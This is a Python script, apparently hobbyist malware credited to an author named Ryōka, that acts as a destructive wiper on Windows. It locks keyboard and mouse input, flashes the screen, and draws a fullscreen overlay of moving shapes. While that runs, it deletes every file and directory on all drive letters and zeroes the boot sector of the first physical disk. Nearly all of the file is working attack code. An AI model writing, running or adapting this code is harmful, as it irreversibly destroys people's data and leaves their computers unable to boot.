# Author: Ryōka
# Contact: ryukakoi 



import os
import shutil
import ctypes
import time
import threading
import tkinter as tk
import random

PATINVERT = 0x005A0049

def glitch_screen(duration=10):
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    hdc = user32.GetDC(0)
    x = user32.GetSystemMetrics(0)
    y = user32.GetSystemMetrics(1)
    start_time = time.time()
    while time.time() - start_time < duration:
        gdi32.PatBlt(hdc, 0, 0, x, y, PATINVERT)
        time.sleep(0.1)
        gdi32.PatBlt(hdc, 0, 0, x, y, PATINVERT)
        time.sleep(0.05)
    user32.ReleaseDC(0, hdc)

def disable_inputs():
    ctypes.windll.user32.BlockInput(True)

def wipe_all_drives():
    drives = [chr(x) + ':\\' for x in range(65, 91) if os.path.exists(chr(x) + ':')]
    for drive in drives:
        for root, dirs, files in os.walk(drive, topdown=False):
            for name in files:
                file_path = os.path.join(root, name)
                try:
                    os.remove(file_path)
                except:
                    pass
            for name in dirs:
                dir_path = os.path.join(root, name)
                try:
                    shutil.rmtree(dir_path)
                except:
                    pass

def overwrite_boot_sector():
    try:
        with open(r'\\.\PhysicalDrive0', 'wb') as disk:
            disk.write(b'\x00' * 512)
    except:
        pass

def spawn_shapes():
    try:
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True, '-transparentcolor', 'black')
        root.configure(bg='black')
        canvas = tk.Canvas(root, bg='black', highlightthickness=0)
        canvas.pack(fill='both', expand=True)
        
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        shapes = []
        
        for _ in range(30):
            shape_type = random.choice(['rect', 'circle'])
            size = random.randint(50, 150) 
            x = random.randint(0, screen_width - size)
            y = random.randint(0, screen_height - size)
            color = f'#{random.randint(128, 255):02x}{random.randint(128, 255):02x}{random.randint(128, 255):02x}'
            dx = random.randint(-10, 10)  
            dy = random.randint(-10, 10)
            if shape_type == 'rect':
                shape = canvas.create_rectangle(x, y, x + size, y + size, fill=color, outline=color)
            else:
                shape = canvas.create_oval(x, y, x + size, y + size, fill=color, outline=color)
            shapes.append((shape, dx, dy, size))
        
        def move_shapes():
            try:
                for shape, dx, dy, size in shapes:
                    canvas.move(shape, dx, dy)
                    coords = canvas.coords(shape)
                    x1, y1 = coords[0], coords[1]
                    if x1 < 0 or x1 > screen_width - size:
                        shapes[shapes.index((shape, dx, dy, size))] = (shape, -dx, dy, size)
                    if y1 < 0 or y1 > screen_height - size:
                        shapes[shapes.index((shape, dx, dy, size))] = (shape, dx, -dy, size)
                root.after(30, move_shapes)  
            except:
                pass
        
        move_shapes()
        root.update()  
        root.mainloop()
    except:
        pass  

if __name__ == "__main__":
    shape_thread = threading.Thread(target=spawn_shapes)
    shape_thread.start()
    time.sleep(1)
    disable_inputs()
    glitch_thread = threading.Thread(target=glitch_screen, args=(30,))
    glitch_thread.start()
    wipe_all_drives()
    overwrite_boot_sector()
    while True:
        time.sleep(1)


